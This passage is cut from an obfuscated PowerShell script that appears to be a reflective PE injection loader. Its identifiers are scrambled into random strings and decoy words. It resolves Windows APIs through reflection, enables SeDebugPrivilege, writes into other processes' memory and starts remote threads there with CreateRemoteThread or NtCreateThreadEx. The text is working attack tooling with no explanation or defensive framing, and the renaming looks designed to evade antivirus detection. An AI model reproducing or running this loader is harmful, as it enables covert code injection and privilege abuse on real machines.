		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function Gatorade
	{
		$lTqSCtGJ99 = New-Object System.Object
		
		$IegTIPEU99 = Guy kernel32.dll VirtualAlloc
		$WYqtxSvv99 = prefix @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$gfRYWgQq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IegTIPEU99, $WYqtxSvv99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name VirtualAlloc -Value $gfRYWgQq99
		
		$fEpyWIuh99 = Guy kernel32.dll VirtualAllocEx
		$kNbizrNI99 = prefix @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$ouHuRhYT99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fEpyWIuh99, $kNbizrNI99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $ouHuRhYT99
		
		$SiFChiDj99 = Guy msvcrt.dll memcpy
		$HdZgBnpd99 = prefix @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$PpslglPB99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SiFChiDj99, $HdZgBnpd99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $PpslglPB99
		
		$aPeWKibv99 = Guy msvcrt.dll memset
		$EfmgbHGz99 = prefix @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$BJlkQHLJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($aPeWKibv99, $EfmgbHGz99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name memset -Value $BJlkQHLJ99
		
		$bQfSJZOX99 = Guy kernel32.dll LoadLibraryA
		$nkSfljnx99 = prefix @([String]) ([IntPtr])
		$eGAIrgNX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bQfSJZOX99, $nkSfljnx99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $eGAIrgNX99
		
		$yBFfkvTs99 = Guy kernel32.dll GetProcAddress
		$iQLGBXcr99 = prefix @([IntPtr], [String]) ([IntPtr])
		$QninbrqG99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yBFfkvTs99, $iQLGBXcr99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $QninbrqG99
		
		$HXpJbcGr99 = Guy kernel32.dll GetProcAddress
		$JtcjzEmz99 = prefix @([IntPtr], [IntPtr]) ([IntPtr])
		$IcwWaWXE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HXpJbcGr99, $JtcjzEmz99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $IcwWaWXE99
		
		$fKTwzILT99 = Guy kernel32.dll VirtualFree
		$kkrDByML99 = prefix @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$gqPFkOOb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fKTwzILT99, $kkrDByML99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name VirtualFree -Value $gqPFkOOb99
		
		$ayXOKzBz99 = Guy kernel32.dll VirtualFreeEx
		$AIjmuOab99 = prefix @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$nMKIWQPJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ayXOKzBz99, $AIjmuOab99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $nMKIWQPJ99
		
		$HNtBwWtc99 = Guy kernel32.dll VirtualProtect
		$RegHUVkQ99 = prefix @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$ljfXsCCQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HNtBwWtc99, $RegHUVkQ99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name VirtualProtect -Value $ljfXsCCQ99
		
		$nEaXeDDJ99 = Guy kernel32.dll GetModuleHandleA
		$jShCCnyo99 = prefix @([String]) ([IntPtr])
		$NUkpyvST99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nEaXeDDJ99, $jShCCnyo99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name GetModuleHandle -Value $NUkpyvST99
		
		$SBQEkacs99 = Guy kernel32.dll FreeLibrary
		$rXLzmzlT99 = prefix @([Bool]) ([IntPtr])
		$aCgpWtqS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SBQEkacs99, $rXLzmzlT99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $aCgpWtqS99
		
		$HpISvSIG99 = Guy kernel32.dll OpenProcess
	    $CLvTtzxu99 = prefix @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $XTSqDgyh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HpISvSIG99, $CLvTtzxu99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $XTSqDgyh99
		
		$FrgDTiSv99 = Guy kernel32.dll WaitForSingleObject
	    $mEnHzSeq99 = prefix @([IntPtr], [UInt32]) ([UInt32])
	    $mMdOQptq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FrgDTiSv99, $mEnHzSeq99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $mMdOQptq99
		
		$jEwKWVMW99 = Guy kernel32.dll WriteProcessMemory
        $qeyeoSIc99 = prefix @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $jWZzUnlI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($jEwKWVMW99, $qeyeoSIc99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $jWZzUnlI99
		
		$IbdFEWij99 = Guy kernel32.dll ReadProcessMemory
        $uqHBYKNd99 = prefix @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $JKtPHHEZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IbdFEWij99, $uqHBYKNd99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $JKtPHHEZ99
		
		$dLWXPhJs99 = Guy kernel32.dll CreateRemoteThread
        $CxpgGyEC99 = prefix @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $lzTSofWX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dLWXPhJs99, $CxpgGyEC99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $lzTSofWX99
		
		$ZpCoVKpG99 = Guy kernel32.dll GetExitCodeThread
        $QareZJre99 = prefix @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $CYvZmeuB99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZpCoVKpG99, $QareZJre99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $CYvZmeuB99
		
		$iZNDhwVy99 = Guy Advapi32.dll OpenThreadToken
        $qMGlcbgs99 = prefix @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $FvaoeTht99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iZNDhwVy99, $qMGlcbgs99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $FvaoeTht99
		
		$KFzVxACZ99 = Guy kernel32.dll GetCurrentThread
        $bxurUJww99 = prefix @() ([IntPtr])
        $itIEshYx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KFzVxACZ99, $bxurUJww99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $itIEshYx99
		
		$eDTdXuMW99 = Guy Advapi32.dll AdjustTokenPrivileges
        $qYjDuBHW99 = prefix @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $DwxwRrMq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eDTdXuMW99, $qYjDuBHW99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $DwxwRrMq99
		
		$SStDZsfN99 = Guy Advapi32.dll LookupPrivilegeValueA
        $BobomZtx99 = prefix @([String], [String], [IntPtr]) ([Bool])
        $CAldkcEr99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SStDZsfN99, $BobomZtx99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $CAldkcEr99
		
		$EkxUcLsv99 = Guy Advapi32.dll ImpersonateSelf
        $DfBroGIv99 = prefix @([Int32]) ([Bool])
        $zGVkuutb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EkxUcLsv99, $DfBroGIv99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $zGVkuutb99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $RomtKSHq99 = Guy NtDll.dll NtCreateThreadEx
            $wzgbNDdv99 = prefix @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $OMGUBAkR99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RomtKSHq99, $wzgbNDdv99)
		    $lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $OMGUBAkR99
        }
		
		$ipiBMRMy99 = Guy Kernel32.dll IsWow64Process
        $jJTpvSLI99 = prefix @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $LbcGRTqi99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ipiBMRMy99, $jJTpvSLI99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $LbcGRTqi99
		
		$fvUQSGOt99 = Guy Kernel32.dll CreateThread
        $kAAiFvwS99 = prefix @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $QdaFAxGj99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fvUQSGOt99, $kAAiFvwS99)
		$lTqSCtGJ99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $QdaFAxGj99
	
		$bkNQtvNd99 = Guy kernel32.dll VirtualFree
		$tkNXTJYF99 = prefix @([IntPtr])
		$onnamRJA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bkNQtvNd99, $tkNXTJYF99)
		$lTqSCtGJ99 | Add-Member NoteProperty -Name LocalFree -Value $onnamRJA99
		return $lTqSCtGJ99
	}
			
	Function spate
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$rLRDDcNM99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$vYLeizkt99
		)
		
		[Byte[]]$hedBMlqh99 = [BitConverter]::GetBytes($rLRDDcNM99)
		[Byte[]]$DDxBxhII99 = [BitConverter]::GetBytes($vYLeizkt99)
		[Byte[]]$hHcPtRNk99 = [BitConverter]::GetBytes([UInt64]0)
		if ($hedBMlqh99.Count -eq $DDxBxhII99.Count)
		{
			$fZaIflBQ99 = 0
			for ($i = 0; $i -lt $hedBMlqh99.Count; $i++)
			{
				$Val = $hedBMlqh99[$i] - $fZaIflBQ99
				if ($Val -lt $DDxBxhII99[$i])
				{
					$Val += 256
					$fZaIflBQ99 = 1
				}
				else
				{
					$fZaIflBQ99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $DDxBxhII99[$i]
				$hHcPtRNk99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($hHcPtRNk99, 0)
	}
	
	Function Cinerama
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$rLRDDcNM99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$vYLeizkt99
		)
		
		[Byte[]]$hedBMlqh99 = [BitConverter]::GetBytes($rLRDDcNM99)
		[Byte[]]$DDxBxhII99 = [BitConverter]::GetBytes($vYLeizkt99)
		[Byte[]]$hHcPtRNk99 = [BitConverter]::GetBytes([UInt64]0)
		if ($hedBMlqh99.Count -eq $DDxBxhII99.Count)
		{
			$fZaIflBQ99 = 0
			for ($i = 0; $i -lt $hedBMlqh99.Count; $i++)
			{
				[UInt16]$Sum = $hedBMlqh99[$i] + $DDxBxhII99[$i] + $fZaIflBQ99
				$hHcPtRNk99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$fZaIflBQ99 = 1
				}
				else
				{
					$fZaIflBQ99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($hHcPtRNk99, 0)
	}
	
	Function prognosticator
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$rLRDDcNM99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$vYLeizkt99
		)
		
		[Byte[]]$hedBMlqh99 = [BitConverter]::GetBytes($rLRDDcNM99)
		[Byte[]]$DDxBxhII99 = [BitConverter]::GetBytes($vYLeizkt99)
		if ($hedBMlqh99.Count -eq $DDxBxhII99.Count)
		{
			for ($i = $hedBMlqh99.Count-1; $i -ge 0; $i--)
			{
				if ($hedBMlqh99[$i] -gt $DDxBxhII99[$i])
				{
					return $true
				}
				elseif ($hedBMlqh99[$i] -lt $DDxBxhII99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function enshrouding
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$eVMOjYJv99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($eVMOjYJv99, 0))
	}
	
	
	Function enumerations
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$SbQUqohh99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$CbNCcEwr99 = [IntPtr](Cinerama ($StartAddress) ($Size))
		
		$gVHQnoGh99 = $PEInfo.EndAddress
		
		if ((prognosticator ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $SbQUqohh99"
		}
		if ((prognosticator ($CbNCcEwr99) ($gVHQnoGh99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $SbQUqohh99"
		}
	}
	
	
	Function Auden
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$jPtrYrug99
		)
	
		for ($twvCHUwr99 = 0; $twvCHUwr99 -lt $Bytes.Length; $twvCHUwr99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($jPtrYrug99, $twvCHUwr99, $Bytes[$twvCHUwr99])
		}
	}
	
	Function prefix
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $lmkKaKBI99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $yJuceBLS99 = [AppDomain]::CurrentDomain
	    $abTySOam99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $hwpgYJcy99 = $yJuceBLS99.DefineDynamicAssembly($abTySOam99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $lwzdJyIc99 = $hwpgYJcy99.DefineDynamicModule('InMemoryModule', $false)
	    $ErxUeQzY99 = $lwzdJyIc99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $hXGdrfrU99 = $ErxUeQzY99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $lmkKaKBI99)
	    $hXGdrfrU99.SetImplementationFlags('Runtime, Managed')
	    $QFqrhZMK99 = $ErxUeQzY99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $lmkKaKBI99)
	    $QFqrhZMK99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $ErxUeQzY99.CreateType()
	}
	Function Guy
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $olvjTdrB99
	    )
	    $tryXRzrP99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $nqAbRoGo99 = $tryXRzrP99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $NUkpyvST99 = $nqAbRoGo99.GetMethod('GetModuleHandle')
	    $QninbrqG99 = $nqAbRoGo99.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    $gJXbymxV99 = $NUkpyvST99.Invoke($null, @($Module))
	    $cZwLcuYy99 = New-Object IntPtr
	    $duXmGPiX99 = New-Object System.Runtime.InteropServices.HandleRef($cZwLcuYy99, $gJXbymxV99)
	    Write-Output $QninbrqG99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$duXmGPiX99, $olvjTdrB99))
	}
	
	
	Function iPhone
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$SafpfqRU99 = $lTqSCtGJ99.GetCurrentThread.Invoke()
		if ($SafpfqRU99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$VsyEuuQT99 = [IntPtr]::Zero
		[Bool]$zShguHvf99 = $lTqSCtGJ99.OpenThreadToken.Invoke($SafpfqRU99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$VsyEuuQT99)
		if ($zShguHvf99 -eq $false)
		{
			$wZgDDpJc99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($wZgDDpJc99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$zShguHvf99 = $lTqSCtGJ99.ImpersonateSelf.Invoke(3)
				if ($zShguHvf99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$zShguHvf99 = $lTqSCtGJ99.OpenThreadToken.Invoke($SafpfqRU99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$VsyEuuQT99)
				if ($zShguHvf99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $wZgDDpJc99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.LUID))
		$zShguHvf99 = $lTqSCtGJ99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($zShguHvf99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$gQjiGmpZ99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.TOKEN_PRIVILEGES)
		[IntPtr]$tnWqdnql99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($gQjiGmpZ99)
		$dnjRQxjw99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tnWqdnql99, [Type]$mVRcZsGx99.TOKEN_PRIVILEGES)
		$dnjRQxjw99.PrivilegeCount = 1
		$dnjRQxjw99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$mVRcZsGx99.LUID)
		$dnjRQxjw99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($dnjRQxjw99, $tnWqdnql99, $true)
		$zShguHvf99 = $lTqSCtGJ99.AdjustTokenPrivileges.Invoke($VsyEuuQT99, $false, $tnWqdnql99, $gQjiGmpZ99, [IntPtr]::Zero, [IntPtr]::Zero)
		$wZgDDpJc99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($zShguHvf99 -eq $false) -or ($wZgDDpJc99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($tnWqdnql99)
	}
	
	
	Function interpretations
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$LSvQiNgY99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$mTRMYGQU99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99
		)
		
		[IntPtr]$IOSbvoxR99 = [IntPtr]::Zero
		
		$FlfIaMsE99 = [Environment]::OSVersion.Version
		if (($FlfIaMsE99 -ge (New-Object 'Version' 6,0)) -and ($FlfIaMsE99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$kfqeSofl99= $lTqSCtGJ99.NtCreateThreadEx.Invoke([Ref]$IOSbvoxR99, 0x1FFFFF, [IntPtr]::Zero, $LSvQiNgY99, $StartAddress, $mTRMYGQU99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$fkAIAkTl99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($IOSbvoxR99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $kfqeSofl99. LastError: $fkAIAkTl99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$IOSbvoxR99 = $lTqSCtGJ99.CreateRemoteThread.Invoke($LSvQiNgY99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $mTRMYGQU99, 0, [IntPtr]::Zero)
		}
		
		if ($IOSbvoxR99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $IOSbvoxR99
	}
	
	Function patronized
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$jdNQCSwb99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99
		)
		
		$uRGiFNCk99 = New-Object System.Object
		
		$BXtFzAsU99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($jdNQCSwb99, [Type]$mVRcZsGx99.IMAGE_DOS_HEADER)
		[IntPtr]$fFWADLAa99 = [IntPtr](Cinerama ([Int64]$jdNQCSwb99) ([Int64][UInt64]$BXtFzAsU99.e_lfanew))
		$uRGiFNCk99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $fFWADLAa99
		$fChpcEFp99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fFWADLAa99, [Type]$mVRcZsGx99.IMAGE_NT_HEADERS64)
		
	    if ($fChpcEFp99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($fChpcEFp99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$uRGiFNCk99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $fChpcEFp99
			$uRGiFNCk99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$YZlBNVfO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fFWADLAa99, [Type]$mVRcZsGx99.IMAGE_NT_HEADERS32)
			$uRGiFNCk99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $YZlBNVfO99
			$uRGiFNCk99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $uRGiFNCk99
	}
	Function motorway
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$sXOvCBLB99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$CSbwkuaG99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sXOvCBLB99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($sXOvCBLB99, 0, $CSbwkuaG99, $sXOvCBLB99.Length) | Out-Null
		
		$uRGiFNCk99 = patronized -jdNQCSwb99 $CSbwkuaG99 -mVRcZsGx99 $mVRcZsGx99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($uRGiFNCk99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($uRGiFNCk99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($uRGiFNCk99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($uRGiFNCk99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($uRGiFNCk99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CSbwkuaG99)
		
		return $PEInfo
	}
	Function restorers
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$jdNQCSwb99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($jdNQCSwb99 -eq $null -or $jdNQCSwb99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		$uRGiFNCk99 = patronized -jdNQCSwb99 $jdNQCSwb99 -mVRcZsGx99 $mVRcZsGx99
		
